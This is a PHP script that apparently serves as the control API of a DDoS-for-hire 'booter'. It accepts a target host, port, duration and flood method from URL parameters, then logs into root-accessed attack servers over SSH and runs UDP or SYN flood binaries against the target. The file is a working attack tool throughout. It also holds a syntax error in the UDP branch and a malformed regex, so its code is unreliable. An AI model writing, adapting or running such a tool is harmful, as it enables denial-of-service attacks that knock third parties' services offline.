<?php

if (!function_exists("ssh2_connect"))
{
    die("Install ssh2 module.\n");
}

if ($_GET["key"] != "APIKEY")
{
    die("No access.");
}

if (isset($_GET["host"], $_GET["port"], $_GET["time"], $_GET["method"]))
{
    $SERVERS =
	[
        "IPOFYOURSERVER" => ["root", "ROOTPASSWORDOFSERVER"],
    ];
	
    class ssh2
    {
        var $connection;
		
        function __construct($host, $user, $pass)
        {
            if (!($this->connection = ssh2_connect($host, 22)))
			{
                throw new Exception("Error connecting to server");
            }
			
            if (!ssh2_auth_password($this->connection, $user, $pass))
			{
                throw new Exception("Error with login credentials");
            }
        }

        function exec($cmd)
        {
            if (!ssh2_exec($this->connection, $cmd))
			{
                throw new Exception("Error executing command: $cmd");
            }

            ssh2_exec($this->connection, "exit");
            unset($this->connection);
        }
    }
	
    $port =
        (int) $_GET["port"] > 0 && (int) $_GET["port"] < 65536
            ? $_GET["port"]
            : 80;
    $port = preg_replace("/\D/", "", $port);
    $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET["host"])
        ? $_GET["host"]
        : die();
    $time =
        (int) $_GET["time"] > 0 && (int) $_GET["time"] < 60 * 60
            ? (int) $_GET["time"]
            : 30;
    $time = preg_replace("/\D/", "", $time);
    $domain = $_GET["host"];
	
    if
	(
        !filter_var($domain, FILTER_VALIDATE_URL) &&
        !filter_var($domain, FILTER_VALIDATE_IP)
    )
	{
        die("Invalid Domain");
    }
	
    $smIP = str_replace(".", "", $ip);
    $smDomain = str_replace(".", "", $domain);
    $smDomain = str_replace("http://", "", $smDomain);
	
    if ($_GET["method"] == "UDP"
	{
        $command = "screen -dmS {$smIP} ./udp {$ip} {$port} 1 500 3 {$time}";
    }
	elseif ($_GET["method"] == "SSYN")
	{
        $command = "screen -dmS {$smIP} ./ssyn {$ip} {$port} {$time}";
    }
	elseif ($_GET["method"] == "STOP")
	{
        $command = "screen -X -s {$smIP} quit";
    }
	else
	{
        die();
    }
	
    foreach ($SERVERS as $server => $credentials)
	{
        $disposable = new ssh2($server, $credentials[0], $credentials[1]);
        $disposable->exec($command);
    }
}

?>
